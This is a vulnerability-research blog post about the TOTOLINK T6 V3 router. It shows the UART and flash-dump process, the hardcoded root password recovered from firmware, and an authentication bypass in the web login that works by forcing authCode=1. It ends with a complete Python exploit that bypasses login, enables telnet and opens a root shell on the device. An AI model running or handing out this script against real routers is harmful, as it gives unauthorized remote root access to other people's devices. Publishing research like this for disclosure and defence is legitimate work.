---

title: 'Getting root shell on TOTOLINK T6 V3'
published: 2025-06-25
description: 'Updating the password during boot time is not enough !!'
image: 'pics/device.png'
tags: ['Blogs', 'IoT', 'Router']
category: 'Blogs'
draft: false
---

I do Vuln research in my free time. Today, my target is TOTOLINK T6 V3.0, The firmware version is `V4.1.5cu.748_B20211015`. After open the plastic shell, I see 4 pin with `GND`, `TX`, `RX`, `VCC`. It should be UART, with the correct baud rate (`38400`). After line and line of log, they ask me for credential to login.

![](pics/uart.png)

## Dumping the Firmware
You can download the newest firmware by this [link](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/190/ids/36.html). The device use `XM25QH64C` SOP-8, I desolder it and use `XGecu T48` to dump the firmware, then use `binwalk` on it.<br>

![](pics/t48.jpg)

## Finding login credentials
We have `SquashFS` at `0x247486`, let's extract it first. First we wanna read `etc/shadow` for login credentials. There are `shadow` and `shadow.sample` file. The `shadow` file is link to `/var/show`, we dont have this file. Lets read init script in `init.d` folder.

![](pics/binwalk.png)

In the `rcS` file, we can see the device will copy the `/etc/shadow.sample` to `/var/shadow`. Therefore, the `shadow.sample` will contain login credentials.

```
cp /etc/shadow.sample /var/shadow
cp /etc/passwd.sample /var/passwd
#cp /etc/vsftpd.conf /var/config/vsftpd.conf
```

Lets look inside that file.

```
root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::
nobody:*:14495:0:99999:7:::
```

We can crack the hash and the login will be `root - cs2012`, but cant login because its wrong.

![](pics/login_fail.png)

## Finding the "real" credentials
Trace the output of UART, we can see they gonna change password during boot time, we need to find where it happen.<br>
Back to the `rcS` script, we can see they call `cs password` after copy `shadow.sample` file. 

```
cp /etc/shadow.sample /var/shadow
cp /etc/passwd.sample /var/passwd
#cp /etc/vsftpd.conf /var/config/vsftpd.conf

cs password
```

Thats why we see the output like `New password:` and `Retype password:`.

![](pics/passwd_log.png)

So we need to reverse the `cs` binary. We can see they echo `KL@UHeZ0` to `/var/tmppwd`, use it to change the password for root and delete it.

![](pics/change_password.png)

So the correct credential is `root - KL@UHeZ0`.

![](pics/login_success.png)

## But...

The problem is I can get a shell only through UART. What if I don't have access to the physical device ? In the web root folder, I see a quite interesting file named `telnet.html`.

![](pics/web_root.png)

This page is use for enable telnet service. If telnet is enabled, we can get a remote shell from the device, sounds great !!<br>
But the problem is we need admin account to enable telnet. We can see the function use for authen in `cstecgi.cgi` binary. First it get the `username` and `password` from request, then compare it with value save on the device.

![](pics/authen.png)

If all good, the binary create a string to help browser redirect, noted that the `authCode` will be `1` if we use correct username/password.

![](pics/redirect.png)

Seem clear, then we continue to look at `lighttpd` - a lightweight web server usually used on embedded systems. Let's see how it process the login phase. Here is the pic about the function named `Form_Login`.

![](pics/form_login.png)

TBH, I dont know WTF is going on there, but I can guess it will try to parse the redirect request. It get out the `authCode`, `username`, `password`, `goURL` and `flag`. It only check the `authCode` with `1` or `0`. If `0` -> show the login page, if `1` -> go to the page `goURL`.

![](pics/check_authCode.png)

We can manipulate the `authCode` to bypass the login page, then with the same session (they use `timestamps` for this), we can turn on telnet. Lets do it:

```python
from pwn import *
import requests, time, sys, os

if len(sys.argv) != 2:
    print("[+] Need device IP !!")
    exit(0)

http_sv = "http://%s/" % sys.argv[1]
url = "formLoginAuth.htm?authCode=1&userName=admin"
cookie = {"SESSION_ID" : "2:%d:2" % round(time.time())}

bypass_admin_url = http_sv + url
requests.get(bypass_admin_url, cookies=cookie)

cgi_url = "cgi-bin/cstecgi.cgi"
payload = """
    {"telnet_enabled":"1","topicurl":"setTelnetCfg"}
"""

enable_telnet_url = http_sv + cgi_url
res = requests.post(enable_telnet_url, data=payload, cookies=cookie)

if res.status_code == 200:
    print("[+] Telnet enabled !!\n[+] Get shell...")

    sleep(1)

    with remote(sys.argv[1], 23) as r:
        r.recvuntil(b"login:")
        r.sendline(b"root")

        r.recvuntil(b"Password:")
        r.sendline(b"KL@UHeZ0")
        r.sendline(b"ls")

        # just for test, r.interactive not working on my :(
        result = r.recvall(timeout=3).splitlines() 
        for i in result:
            print(i.decode())

        r.interactive()

```

![](pics/get_shell.png)